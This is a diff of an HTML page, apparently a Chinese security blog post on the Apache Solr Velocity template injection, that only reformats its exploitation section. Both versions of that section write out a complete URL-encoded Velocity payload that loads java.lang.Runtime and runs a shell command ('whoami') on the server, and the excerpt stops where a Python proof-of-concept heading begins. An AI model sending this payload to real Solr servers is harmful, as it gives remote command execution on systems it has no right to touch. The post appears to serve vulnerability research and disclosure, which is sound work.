@@ -479,8 +479,7 @@
     &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
   }
 }</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163002.png" alt></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>url/solr/core name/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163326.png" alt></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code>url/solr/core name/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163326.png" alt></p>
 <h1 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h1><pre><code>#! python3
 &quot;&quot;&quot;
 
